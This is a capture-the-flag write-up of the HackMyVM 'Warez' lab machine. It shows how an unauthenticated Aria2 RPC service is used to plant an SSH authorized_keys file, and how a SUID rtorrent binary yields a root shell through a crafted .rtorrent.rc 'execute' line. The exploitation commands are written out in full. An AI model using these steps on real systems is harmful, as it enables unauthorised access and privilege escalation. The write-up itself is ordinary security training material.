# Warez

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Warez | sml | Beginner | HackMyVM |

**Summary:** Warez is a beginner-level Linux machine from HackMyVM that demonstrates an interesting attack vector involving the Aria2 download manager. The machine exposes three services: SSH (port 22), an Aria2 WebUI (port 80), and an Aria2 JSON-RPC service (port 6800). The vulnerability lies in the misconfigured Aria2 service running with default insecure settings (no secret token), which allows unauthenticated users to control the download manager. By leveraging this access, attackers can abuse Aria2's download functionality to upload an SSH authorized_keys file to a user's home directory, achieving SSH access as the user 'carolina'. Privilege escalation is accomplished by exploiting a SUID binary (`/usr/bin/rtorrent`) found during enumeration, which can be leveraged to spawn a root shell using GTFOBins techniques.

---

## Reconnaissance

### Network Discovery

The first step in attacking the Warez machine was identifying the target on the network. Using a custom PowerShell network scanner, the target was identified as a VirtualBox VM at IP address 192.168.100.58:

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.58 08:00:27:41:DB:0B VirtualBox
```

### Port Scanning and Service Enumeration

With the target identified, a comprehensive Nmap scan was conducted to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ nmap -sC -sV -p- 192.168.100.58
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 17:39 WIB
Nmap scan report for 192.168.100.58
Host is up (0.0050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 cc:00:63:dd:49:fb:1c:c7:ac:69:63:bc:05:1a:59:cd (RSA)
|   256 9b:19:49:25:eb:9c:60:c5:2b:ec:2a:d4:fd:d1:c2:f4 (ECDSA)
|_  256 41:16:e6:d0:a0:da:22:4f:07:3f:c8:cf:60:2c:02:79 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Aria2 WebUI
6800/tcp open  http    aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.35 seconds
```

**Analysis:** Three ports were discovered:
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5 - standard SSH service for remote access
- **Port 80 (HTTP)**: nginx 1.18.0 hosting an "Aria2 WebUI" - a web interface for the Aria2 download manager
- **Port 6800 (HTTP)**: aria2 downloader JSON-RPC - the backend RPC service for Aria2

The presence of Aria2 WebUI on port 80 and its corresponding JSON-RPC service on port 6800 immediately stood out as a potential attack vector, as download managers often have functionality to write files to the filesystem.

---

## Initial Access

### Web Application Analysis

Navigating to http://192.168.100.58 revealed the Aria2 WebUI interface:

![aria2webui](image-1.png)

The interface displays a functional download manager with various filters (Running, Active, Waiting, Complete, Error, Paused, Removed) and **Quick Access Settings** visible in the left sidebar. Critically, the Quick Access Settings revealed:
- **dir**: `/home/carolina` - indicating the default download directory belongs to a user named "carolina"
- **conf-path**: `/home/carolina/.config/aria2/aria2.conf` - the configuration file path
- **auto-file-renaming**: true
- **max-connection-per-server**: 1

This information confirmed that the Aria2 service was running as user 'carolina' and had write access to that user's home directory.

### Aria2 Connection Settings Analysis

Clicking on **Settings > Connection Settings** revealed the RPC configuration:

![connection settings](image-2.png)

The Connection Settings dialog showed:
- **Enter the host**: http:// 192.168.100.58
- **Enter the port**: 6800
- **Enter the RPC path**: http://192.168.100.58:6800 /jsonrpc
- **SSL/TLS encryption**: Not enabled
- **Enter the secret token (optional)**: **EMPTY** - No authentication required!
- **Enter the username (optional)**: Empty
- **Enter the password (optional)**: Empty

After clicking "Save Connection configuration", the interface displayed a critical security message:

![status connection](image-3.png)

The notification stated: "*Successfully connected to Aria2 through remote RPC, however the connection is still insecure. For complete security try adding an authorization secret token while starting Aria2 (through the flag --rpc-secret)*"

**This confirms the vulnerability:** The Aria2 RPC service is accessible without authentication, allowing anyone to control the download manager and specify arbitrary download locations.

### Exploitation Strategy: SSH Authorized Keys Upload

The attack vector became clear: 
1. Aria2 can download files from any URL
2. Aria2 is running as user 'carolina' 
3. We can control the download destination directory
4. We can upload an SSH `authorized_keys` file to `/home/carolina/.ssh/`
5. This grants us SSH access as carolina

### Generating SSH Keys

First, a new RSA key pair was generated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ ssh-keygen -t rsa -N "" -f id_rsa_warez
Generating public/private rsa key pair.
Your identification has been saved in id_rsa_warez
Your public key has been saved in id_rsa_warez.pub
The key fingerprint is:
SHA256:aKFzvKEzHXAOP8jJ7/qeTKYJcTFrLlwbhNab0IAi7pQ ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 3072]----+
| ..              |
|+  =             |
|+ = O o          |
| E = ^ o         |
|o . / @ S        |
| o * X =         |
|  + * *          |
|   o X .         |
|    ++*          |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ cp id_rsa_warez.pub authorized_keys
```

The public key (`id_rsa_warez.pub`) was copied to a file named `authorized_keys`, following SSH's standard naming convention.

### Setting Up HTTP Server

To make the `authorized_keys` file accessible to Aria2, a Python HTTP server was started in the directory containing the file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

This server allowed the target machine to download the authorized_keys file via HTTP.

### Uploading Authorized Keys via Aria2

In the Aria2 WebUI, the **Add** menu was accessed and **by URIs** was selected:

![add downloads by uris](image-5.png)

The "Add Downloads By URIs" dialog was configured as follows:
- **URI**: `http://192.168.100.1:8080/authorized_keys` (attacker's IP and HTTP server)
- **Download settings**:
  - **dir**: `/home/carolina/.ssh` - critical destination directory for SSH keys
  - **max-connection-per-server**: 1

After clicking **Start**, Aria2 began downloading the file to the specified directory.

The download completed successfully:

![download succes](image-6.png)

The interface showed:
- **File**: authorized_keys
- **Status**: ✓ Complete
- **Size**: 573 B (573 bytes)
- **Download Speed**: 0 B
- **Ratio**: 0.00
- **Location**: /home/carolina/.ssh

Simultaneously, the Python HTTP server logged the successful file transfer:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [01/Feb/2026 17:59:01] "GET /authorized_keys HTTP/1.1" 200 -
```

The HTTP 200 response confirmed that Aria2 successfully retrieved the authorized_keys file.

### SSH Access as Carolina

With the authorized_keys file now in place, SSH authentication using the private key was attempted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warez]
└─$ ssh -i id_rsa_warez carolina@192.168.100.58
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
carolina@warez:~$ id
uid=1000(carolina) gid=1000(carolina) groups=1000(carolina),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
carolina@warez:~$ ls -la
total 40
drwxr-xr-x 4 carolina carolina 4096 Aug 31  2021 .
drwxr-xr-x 3 root     root     4096 Aug 30  2021 ..
-rw-r--r-- 1 carolina carolina  220 Aug 30  2021 .bash_logout
-rw-r--r-- 1 carolina carolina 3526 Aug 30  2021 .bashrc
drwxr-xr-x 3 carolina carolina 4096 Aug 31  2021 .local
-rw-r--r-- 1 carolina carolina  807 Aug 30  2021 .profile
-rw-r--r-- 1 carolina carolina   66 Aug 31  2021 .selected_editor
drwx------ 2 carolina carolina 4096 Feb  1 05:59 .ssh
-rw------- 1 carolina carolina   19 Aug 31  2021 user.txt
-rw------- 1 carolina carolina   51 Aug 31  2021 .Xauthority
```

**Success!** SSH access was gained as user carolina. The `.ssh` directory (created at 05:59 on Feb 1) contains our injected authorized_keys file. The **user flag** is present in `user.txt`.

---

## Privilege Escalation

### SUID Binary Enumeration

With user-level access established, the next phase involved searching for privilege escalation vectors. A common technique is to search for SUID binaries, which can potentially be exploited to gain root access:

```bash
carolina@warez:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 35040 Jul 28  2021 /usr/bin/umount
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55528 Jul 28  2021 /usr/bin/mount
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-sr-x 1 root root 2087648 Dec 29  2019 /usr/bin/rtorrent
-rwsr-xr-x 1 root root 71912 Jul 28  2021 /usr/bin/su
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
carolina@warez:~$ file /usr/bin/rtorrent
/usr/bin/rtorrent: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7c688948ec2623bead56a965c1c5804fa1a0d3b, for GNU/Linux 3.2.0, stripped
```

**Critical Finding:** `/usr/bin/rtorrent` stands out as unusual - it's a BitTorrent client with both SUID and SGID bits set (`-rwsr-sr-x`), owned by root. Most standard SUID binaries are for system utilities (mount, su, passwd), but rtorrent should not require elevated privileges. The file is 2,087,648 bytes (approximately 2 MB) and was compiled on Dec 29, 2019.

### RTorrent Binary Analysis

Examining the rtorrent help menu to understand its capabilities:

```bash
carolina@warez:~$ /usr/bin/rtorrent -h
Rakshasa's BitTorrent client version 0.9.8.

All value pairs (f.ex rate and queue size) will be in the UP/DOWN
order. Use the up/down/left/right arrow keys to move between screens.

Usage: rtorrent [OPTIONS]... [FILE]... [URL]...
  -D                Enable deprecated commands
  -h                Display this very helpful text
  -n                Don't try to load rtorrent.rc on startup
  -b <a.b.c.d>      Bind the listening socket to this IP
  -i <a.b.c.d>      Change the IP that is sent to the tracker
  -p <int>-<int>    Set port range for incoming connections
  -d <directory>    Save torrents to this directory by default
  -s <directory>    Set the session directory
  -o key=opt,...    Set options, see 'rtorrent.rc' file

Main view keys:
  backspace         Add a torrent url or path
  ^s                Start torrent
  ^d                Stop torrent or delete a stopped torrent
  ^r                Manually initiate hash checking
  ^o                Change the destination directory of the download. The torrent must be closed.
  ^q                Initiate shutdown or skip shutdown process
  a,s,d,z,x,c       Adjust upload throttle
  A,S,D,Z,X,C       Adjust download throttle
  I                 Toggle whether torrent ignores ratio settings
  right             View torrent

Download view keys:
  spacebar          Depends on the current view
  1,2               Adjust max uploads
  3,4,5,6           Adjust min/max connected peers
  t/T               Query tracker for more peers / Force query
  *                 Snub peer
  right             View files
  p                 View peer information
  o                 View trackers

Report bugs to <sundell.software@gmail.com>.
```

The key detail here is the mention of configuration options being loaded from the `rtorrent.rc` file. This suggests the binary can execute arbitrary commands defined in its configuration file.

### GTFOBins Research

Consulting GTFOBins (a curated list of Unix binaries that can be exploited for privilege escalation), the rtorrent entry revealed a privilege escalation method:

![alt text](image-7.png)

The GTFOBins page for rtorrent (with 12,569 stars on GitHub) shows a **Shell** exploitation technique under the **SUID** category. The explanation states:

> "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped."

The **Remarks** section provides critical information:
> "This executable runs commands directly, e.g., via functions like `exec`, remember to omit the `-p` argument of every `/bin/sh` invocation for distributions where the default shell does not drop SUID privileges."

The exploitation code provided is:
```bash
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

**Explanation:** This creates a `.rtorrent.rc` configuration file that uses rtorrent's `execute` command to spawn a shell with the `-p` flag, which preserves the SUID privileges, resulting in an effective UID (euid) of 0 (root).

### Exploitation: Root Shell

Following the GTFOBins instructions, the malicious configuration file was created:

```bash
carolina@warez:~$ echo 'execute.throw = /bin/bash,-p,-c,"/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty"
' > ~/.rtorrent.rc
carolina@warez:~$ /usr/bin/rtorrent
-rw-r--r-- 1 carolina carolina 74 Feb  1 06:22 .rtorrent.rc
```

Note: The command used `execute.throw` (a slightly modified syntax) instead of just `execute`, which is the modern rtorrent syntax for immediate command execution.

After executing `/usr/bin/rtorrent`, a root shell was obtained:

```bash
carolina@warez:~$ /usr/bin/rtorrent
bash-5.1# id
uid=1000(carolina) gid=1000(carolina) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(carolina)
bash-5.1# whoami ; hostname
root
warez
bash-5.1# cat /home/carolina/user.txt /root/root.txt
HMVK[REDACTED]
HMVK[REDACTED]
```

**Analysis of the root shell:**
- **uid=1000(carolina)** - Real user ID remains carolina
- **euid=0(root)** - Effective user ID is root (this grants root privileges)
- **egid=0(root)** - Effective group ID is root
- **groups=0(root),...,1000(carolina)** - Member of both root and carolina groups

The effective UID/GID being 0 means all file operations and system calls are performed with root privileges, despite the real UID still being 1000.

**Machine pwned!**

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network scanning to identify target at 192.168.100.58, followed by comprehensive Nmap scan revealing three services: SSH (22), Aria2 WebUI on nginx (80), and Aria2 JSON-RPC (6800).

2. **Vulnerability Discovery**: Analyzed Aria2 WebUI and discovered the RPC service was configured with default insecure settings (no secret token authentication), allowing unauthenticated remote control. Identified the service was running as user 'carolina' with write access to `/home/carolina`.

3. **Exploitation**: Generated SSH key pair, hosted the public key via Python HTTP server, and leveraged Aria2's unauthenticated download functionality to upload `authorized_keys` to `/home/carolina/.ssh/`, establishing SSH access as user carolina.

4. **Internal Enumeration**: Performed SUID binary enumeration using `find / -type f -perm -4000`, discovering an unusual SUID binary `/usr/bin/rtorrent` (a BitTorrent client) with both setuid and setgid bits set and owned by root.

5. **Privilege Escalation**: Exploited rtorrent's configuration file execution capability by creating a malicious `.rtorrent.rc` file containing an `execute.throw` command that spawned a bash shell with preserved SUID privileges (`-p` flag), resulting in effective root access (euid=0) and retrieval of both user and root flags.

